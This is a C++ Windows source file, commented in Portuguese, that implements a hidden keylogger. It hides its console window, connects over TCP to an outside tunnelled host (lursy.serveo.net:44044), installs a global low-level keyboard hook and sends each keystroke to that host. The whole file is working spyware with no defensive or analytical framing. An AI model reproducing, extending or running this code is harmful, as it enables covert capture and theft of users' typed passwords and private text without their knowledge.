#include <iostream>
#include <winsock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <algorithm>
#include "normalize.h"

#pragma comment(lib, "ws2_32.lib")


SOCKET clientSocket = INVALID_SOCKET;
normalize caractere;

int special_keys[] = {
	VK_SPACE, VK_RETURN, VK_BACK, VK_TAB, VK_CAPITAL, VK_CLEAR, VK_ESCAPE, VK_DELETE,
	VK_CONTROL, VK_LCONTROL, VK_RCONTROL,
	VK_SHIFT, VK_LSHIFT, VK_RSHIFT,
	VK_MENU, VK_LMENU, VK_RMENU
};

int unlock = 0;

int connect_server(){
	// inicializando winsock
	WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Falha ao inicializar o Winsock" << std::endl;
        return 0;
    }
    
    // Configurar informações sobre o servidor
    addrinfo hints, *result = nullptr;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo("lursy.serveo.net", "44044", &hints, &result) != 0) {
        std::cerr << "Erro ao obter informações sobre o endereço do servidor" << std::endl;
        WSACleanup();
        return 0;
    }
    
	// criar socket
	clientSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Erro ao criar o socket: " << WSAGetLastError() << std::endl;
        freeaddrinfo(result);
        WSACleanup();
        return 0;
    }
	
    
    // Conectar ao servidor
    if (connect(clientSocket, result->ai_addr, result->ai_addrlen) == SOCKET_ERROR) {
        std::cerr << "Erro ao conectar ao servidor: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        freeaddrinfo(result);
        WSACleanup();
        return 0;
    }
    
    freeaddrinfo(result);
    return 1;

}


LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
			int keyCode = kbStruct->vkCode;
			bool capital = GetKeyState(VK_CAPITAL);
			bool shift = GetAsyncKeyState(VK_SHIFT);
			bool isSpecialKey = std::find(std::begin(special_keys), std::end(special_keys), keyCode) != std::end(special_keys);

			if(isSpecialKey){
				if(unlock){
					std::string message = caractere.SpecialKeys(keyCode);
					send(clientSocket, message.c_str(), message.size(), 0);
				}
			}else{
			
				// NUMLOCK
				if (keyCode >= 96 && keyCode <= 105){
					keyCode -= 48;
				}
			
				if ((keyCode >= 65 && keyCode <= 90) && !(capital ^ shift)){
					keyCode += 32; // muda o ascii para o de letra minuscula
				}
				
				if(shift){
					keyCode = caractere.ShiftNum(keyCode);
				}
				
				if(unlock){
					char letter = static_cast<char>(keyCode);
					send(clientSocket, &letter, 1, 0);
				}
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int main() {
	// Fecha a janela do terminal
	FreeConsole();
	
	// Conecta-se ao servidor
	unlock = connect_server();
	std::cout << unlock;
	
	// Instala o gancho de teclado
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
	
	// Mantém o programa em execução
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	// Remove o gancho de teclado antes de encerrar o programa
	UnhookWindowsHookEx(hook);
	
	return 0;
}